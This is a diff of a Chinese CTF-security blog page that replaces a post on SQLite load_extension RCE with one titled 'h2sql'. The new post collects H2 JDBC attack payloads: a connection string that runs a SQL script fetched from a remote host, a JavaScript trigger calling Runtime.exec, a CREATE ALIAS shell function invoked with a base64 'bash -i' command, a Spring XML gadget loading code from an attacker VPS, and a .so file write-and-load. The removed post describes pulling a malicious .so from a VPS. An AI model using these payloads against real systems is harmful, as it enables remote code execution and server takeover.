@@ -9,7 +9,7 @@
     
     <title>
         
-            sqlite攻击 |
+            h2sql |
         
         1diot9&#39;s Blog
     </title>
@@ -238,7 +238,7 @@
             <div class="post-content-bottom border-box">
                 
                     <div class="post-title">
-                        sqlite攻击
+                        h2sql
                     </div>
                 
 
@@ -266,13 +266,13 @@
         
             <span class="meta-info-item post-create-date">
                 <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
-                <span class="datetime">2025-05-05 19:59:36</span>
+                <span class="datetime">2025-05-05 20:10:09</span>
             </span>
 
             
                 <span class="meta-info-item post-update-date">
                     <i class="icon fa-solid fa-file-pen"></i>&nbsp;
-                    <span class="datetime" data-updated="Mon May 05 2025 19:59:59 GMT+0800">2025-05-05 19:59:59</span>
+                    <span class="datetime" data-updated="Mon May 05 2025 20:10:29 GMT+0800">2025-05-05 20:10:29</span>
                 </span>
             
         
@@ -302,12 +302,12 @@
         
         
             <span class="meta-info-item post-wordcount">
-                <i class="icon fas fa-file-word"></i>&nbsp;<span>341 字</span>
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>511 字</span>
             </span>
         
         
             <span class="meta-info-item post-min2read">
-                <i class="icon fas fa-clock"></i>&nbsp;<span>1 分钟</span>
+                <i class="icon fas fa-clock"></i>&nbsp;<span>2 分钟</span>
             </span>
         
         
@@ -329,16 +329,30 @@
                     
 
                     
-                         <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>适用于load_extension打开的情况，比如：<img   src="/2025/05/03/JNI/te%E6%94%BB%E5%87%BB/image.png"  alt="img"></p>
-<p>虽然这种情况现实中比较少。</p>
-<p>第一次遇到是在ciscn24_ezjava上</p>
-<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>首先你需要知道，sqlite是一个内存数据库，直接存储在本地，没有server，client一说。一个sqlite数据库就是一个文件，类似test.db。你可以随机新建一个db文件，然后创建sqlite时打开，这样之后产生的数据都会写在这个db文件上。sqlite无法跟mysql一样返回反序列化数据，只能通过加载so文件实现RCE</p>
-<p>漏洞利用流程：</p>
-<p>（前提：靶机能够执行select * from xxx，xxx可控）</p>
-<p>1、在vps上创建rce.c，编译成rce.so。通过JDBC连接(jdbc:sqlite::resource:<a class="link"   target="_blank" rel="noopener" href="http://10.195.247.79:7776/rce.so)%EF%BC%8C%E5%8F%AF%E4%BB%A5%E8%8E%B7%E5%8F%96vps%E4%B8%8A%E7%9A%84rce.so%EF%BC%8C%E5%B9%B6%E4%BF%9D%E5%AD%98%E5%88%B0/tmp/sqlite-jdbc-tmp-xxxx.db%E3%80%82%E5%85%B6%E4%B8%ADxxxx%E7%9A%84%E8%AE%A1%E7%AE%97%E6%96%B9%E5%BC%8F%E5%8F%AF%E7%9F%A5%E3%80%82" >http://10.195.247.79:7776/rce.so)，可以获取vps上的rce.so，并保存到/tmp/sqlite-jdbc-tmp-xxxx.db。其中xxxx的计算方式可知。<i class="fas fa-external-link-alt"></i></a></p>
-<p>2、新建exp.db，用navicat创建一个sqlite连接。新建一个查询，执行CREATE VIEW security as SELECT (SELECT load_extension(‘&#x2F;tmp&#x2F;sqlite-jdbc-tmp–xxxx.db’)); 这样会新建一个视图</p>
-<p>3、通过JDBC连接，可以获取vps上的exp.db，执行load_extension，加载之前的so文件，实现rce。即靶机最后执行select * from security</p>
-<p>如果能写文件的话，那就直接写so文件，然后加载就行了。最终的目的反正都是加载so文件。</p>
+                         <p>第一次用到是在ez_solon里面</p>
+<p>先简单给个EXP吧，之后再碰到再详细写</p>
+<p>找有getConnect的类，然后url这样写</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">UnpooledDataSource</span> <span class="variable">dataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnpooledDataSource</span>(<span class="string">&quot;jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#x27;http://127.0.0.1:8000/h2.sql&#x27;&quot;</span>, <span class="string">&quot;1diOt9&quot;</span>, <span class="string">&quot;123456&quot;</span>, <span class="string">&quot;org.database.Driver&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>.sql文件有多种写法</p>
+<h1 id="Script引擎加载（jdk17失效）"><a href="#Script引擎加载（jdk17失效）" class="headerlink" title="Script引擎加载（jdk17失效）"></a>Script引擎加载（jdk17失效）</h1><p>一是直接用JavaScript引擎加载执行：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE TABLE</span> test (</span><br><span class="line">     id <span class="type">INT</span> <span class="keyword">NOT NULL</span></span><br><span class="line"> );</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TRIGGER</span> TRIG_JS BEFORE <span class="keyword">INSERT</span> <span class="keyword">ON</span> TEST <span class="keyword">AS</span> <span class="string">&#x27;//javascript</span></span><br><span class="line"><span class="string">Java.type(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;calc&quot;);&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>值得注意的是，这个方法在jdk17里会失效，因为Java17版本中JavaScript引擎(Nashorn)已经被删除。NCTF25的H2 Revenge就考了这个。</p>
+<h1 id="定义函数执行"><a href="#定义函数执行" class="headerlink" title="定义函数执行"></a>定义函数执行</h1><p>二是定义一个函数执行：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> ALIAS SHELL <span class="keyword">AS</span> $$ String shellexec(String cmd) throws java.io.IOException &#123; System.setSecurityManager(<span class="keyword">null</span>);java.util.Scanner s <span class="operator">=</span> <span class="keyword">new</span> java.util.Scanner(Runtime.getRuntime().<span class="keyword">exec</span>(cmd).getInputStream()).useDelimiter(&quot;\\A&quot;); <span class="keyword">return</span> s.hasNext() ? s.next() : &quot;&quot;;  &#125;$$;<span class="keyword">CALL</span> SHELL(<span class="string">&#x27;bash -c &#123;echo,aaa&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>值得注意的是如果只有jre而没有jdk，那么这个也会失效。因为这个方法需要jdk将函数编译后使用，如果只有jre就没办法编译了。</p>
+<h1 id="调用public-static-函数"><a href="#调用public-static-函数" class="headerlink" title="调用public static 函数"></a>调用public static 函数</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">MyDataSource</span> <span class="variable">myDataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyDataSource</span>(<span class="string">&quot;jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#x27;http://127.0.0.1:8000/poc.sql&#x27;&quot;</span>, <span class="string">&quot;1diOt9&quot;</span>, <span class="string">&quot;123456&quot;</span>);</span><br><span class="line">CREATE ALIAS CLASS_FOR_NAME FOR <span class="string">&#x27;java.lang.Class.forName(java.lang.String)&#x27;</span>;</span><br><span class="line">CREATE ALIAS NEW_INSTANCE FOR <span class="string">&#x27;org.springframework.cglib.core.ReflectUtils.newInstance(java.lang.Class, java.lang.Class[], java.lang.Object[])&#x27;</span>;</span><br><span class="line">CREATE ALIAS UNESCAPE_VALUE FOR <span class="string">&#x27;javax.naming.ldap.Rdn.unescapeValue(java.lang.String)&#x27;</span>;</span><br><span class="line"></span><br><span class="line">SET <span class="meta">@url_str</span>=<span class="string">&#x27;http://vps:port/h2_revenge_evil.xml&#x27;</span>;</span><br><span class="line">SET <span class="meta">@url_obj</span>=UNESCAPE_VALUE(<span class="meta">@url_str</span>);</span><br><span class="line">SET <span class="meta">@context_clazz</span>=CLASS_FOR_NAME(<span class="string">&#x27;org.springframework.context.support.ClassPathXmlApplicationContext&#x27;</span>);</span><br><span class="line">SET <span class="meta">@string_clazz</span>=CLASS_FOR_NAME(<span class="string">&#x27;java.lang.String&#x27;</span>);</span><br><span class="line"></span><br><span class="line">CALL <span class="title function_">NEW_INSTANCE</span><span class="params">(<span class="meta">@context_clazz</span>, ARRAY[<span class="meta">@string_clazz</span>], ARRAY[<span class="meta">@url_obj</span>])</span>;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h1><p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/Err0r233/article/details/146484415" >NCTF2024 Web方向题解-CSDN博客<i class="fas fa-external-link-alt"></i></a></p>
+<p>CALL FILE_WRITE(X’自己的so的十六进制编码’, ‘&#x2F;tmp&#x2F;exp.so’);</p>
+<p>CREATE ALIAS IF NOT EXISTS System_load FOR “java.lang.System.load(java.lang.String)”;</p>
+<p>CALL System_load(‘&#x2F;tmp&#x2F;exp.so’);</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/ArcherCY/p/17699288.html" >H2 database漏洞复现 - Running_J - 博客园<i class="fas fa-external-link-alt"></i></a></p>
+<p>[JavaSec&#x2F;9.JDBC Attack&#x2F;h2&#x2F;index.md at main · Y4tacker&#x2F;JavaSec](<a class="link"   target="_blank" rel="noopener" href="https://github.com/Y4tacker/JavaSec/blob/main/9.JDBC" >https://github.com/Y4tacker/JavaSec/blob/main/9.JDBC<i class="fas fa-external-link-alt"></i></a> Attack&#x2F;h2&#x2F;index.md)</p>
 
                     
                 </div>
@@ -349,11 +363,11 @@
     <div class="copyright-info-content border-box">
         <div class="copyright-info-top border-box">
             <div class="copyright-post-title border-box text-ellipsis">
-                sqlite攻击
+                h2sql
             </div>
 
             <div class="copyright-post-link border-box text-ellipsis">
-                2025/05/05/sqlite攻击/
+                2025/05/05/h2sql/
             </div>
         </div>
 
@@ -369,7 +383,7 @@
                 <div class="type">
                     发布于
                 </div>
-                <div class="content">2025-05-05 19:59</div>
+                <div class="content">2025-05-05 20:10</div>
             </div>
 
 
@@ -424,14 +438,14 @@
                             <div class="prev-post">
                                 <a class="prev"
                                    rel="prev"
-                                   href="/2025/05/05/hsql/"
-                                   title="hsql"
+                                   href="/2025/05/05/Derby/"
+                                   title="Derby"
                                 >
                                     <span class="left arrow-icon flex-center">
                                         <i class="fas fa-chevron-left"></i>
                                     </span>
                                     <span class="title flex-center">
-                                        <span class="post-nav-title-item text-ellipsis">hsql</span>
+                                        <span class="post-nav-title-item text-ellipsis">Derby</span>
                                         <span class="post-nav-item">上一篇</span>
                                     </span>
                                 </a>
@@ -441,11 +455,11 @@
                             <div class="next-post">
                                 <a class="next"
                                    rel="next"
-                                   href="/2025/05/05/mysql-JDBC-%E7%BB%95%E8%BF%87/"
-                                   title="mysql JDBC 绕过"
+                                   href="/2025/05/05/postgreSQL/"
+                                   title="postgreSQL"
                                 >
                                     <span class="title flex-center">
-                                        <span class="post-nav-title-item text-ellipsis">mysql JDBC 绕过</span>
+                                        <span class="post-nav-title-item text-ellipsis">postgreSQL</span>
                                         <span class="post-nav-item">下一篇</span>
                                     </span>
                                     <span class="right arrow-icon flex-center">
@@ -473,7 +487,7 @@
             <div class="pc-post-toc right-toc">
                 <div class="post-toc-wrap border-box">
     <div class="post-toc border-box">
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-number">2.</span> <span class="nav-text">分析</span></a></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Script%E5%BC%95%E6%93%8E%E5%8A%A0%E8%BD%BD%EF%BC%88jdk17%E5%A4%B1%E6%95%88%EF%BC%89"><span class="nav-number">1.</span> <span class="nav-text">Script引擎加载（jdk17失效）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%9A%E4%B9%89%E5%87%BD%E6%95%B0%E6%89%A7%E8%A1%8C"><span class="nav-number">2.</span> <span class="nav-text">定义函数执行</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%B0%83%E7%94%A8public-static-%E5%87%BD%E6%95%B0"><span class="nav-number">3.</span> <span class="nav-text">调用public static 函数</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%86%99%E6%96%87%E4%BB%B6"><span class="nav-number">4.</span> <span class="nav-text">写文件</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">5.</span> <span class="nav-text">参考</span></a></li></ol>
     </div>
 </div>
 
@@ -663,7 +677,7 @@
             <div class="tablet-post-toc">
                 <div class="post-toc-wrap border-box">
     <div class="post-toc border-box">
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-number">2.</span> <span class="nav-text">分析</span></a></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Script%E5%BC%95%E6%93%8E%E5%8A%A0%E8%BD%BD%EF%BC%88jdk17%E5%A4%B1%E6%95%88%EF%BC%89"><span class="nav-number">1.</span> <span class="nav-text">Script引擎加载（jdk17失效）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%9A%E4%B9%89%E5%87%BD%E6%95%B0%E6%89%A7%E8%A1%8C"><span class="nav-number">2.</span> <span class="nav-text">定义函数执行</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%B0%83%E7%94%A8public-static-%E5%87%BD%E6%95%B0"><span class="nav-number">3.</span> <span class="nav-text">调用public static 函数</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%86%99%E6%96%87%E4%BB%B6"><span class="nav-number">4.</span> <span class="nav-text">写文件</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">5.</span> <span class="nav-text">参考</span></a></li></ol>
     </div>
 </div>
 
